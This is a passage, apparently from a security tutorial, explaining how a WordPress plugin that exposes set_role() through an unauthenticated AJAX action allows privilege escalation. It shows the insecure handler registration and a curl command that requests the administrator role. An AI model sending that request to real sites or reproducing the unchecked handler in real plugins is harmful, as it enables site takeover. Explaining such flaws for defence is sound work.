...
WordPress provides the `WP_User::set_role()` method to change a user’s role. It’s a legitimate way for an administrator to move a user from one role to another (for example, from “author” to “editor”).

If a plugin exposes this functionality via an AJAX or REST endpoint without strict permission checks, an attacker could abuse it to elevate their privileges.

```php
add_action( 'wp_ajax_change_user_role', 'myplugin_change_user_role' );
add_action( 'wp_ajax_nopriv_change_user_role', 'myplugin_change_user_role' );

function myplugin_change_user_role() {
    ...
    wp_send_json_success( array( 'message' => 'Role changed' ) );
}
```
...
```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=change_user_role -d "new_role=administrator"
``` 
